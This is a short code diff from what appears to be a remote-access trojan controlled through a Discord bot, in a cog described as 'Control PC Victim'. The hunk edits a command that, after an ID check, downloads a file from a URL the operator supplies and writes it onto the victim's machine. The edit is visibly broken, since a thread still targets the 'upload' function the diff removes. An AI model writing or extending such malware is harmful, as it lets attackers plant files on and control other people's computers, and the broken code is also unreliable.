@@ -128,13 +128,12 @@ class Control(commands.Cog, description='Control PC Victim'):
 		if not CheckID(ID):
 			return
 		await SendOutput(ctx, 'Starting Upload...}')
-		def upload():
-			response = requests.get(url)
-			parse = urlparse(url)
-			filename = os.path.basename(parse.path)
-			open(f'{path_file}/{filename}', "wb").write(response.content)
-			task_send_output = asyncio.create_task(SendOutput(ctx, f"Uploaded File {path_file}/{filename}"))
-			done, pendding = await asyncio.wait(task_send_output)
+		response = requests.get(url)
+		parse = urlparse(url)
+		filename = os.path.basename(parse.path)
+		open(f'{path_file}/{filename}', "wb").write(response.content)
+		task_send_output = asyncio.create_task(SendOutput(ctx, f"Uploaded File {path_file}/{filename}"))
+		done, pendding = await asyncio.wait(task_send_output)
 
 		threading.Thread(target = upload).start()
 
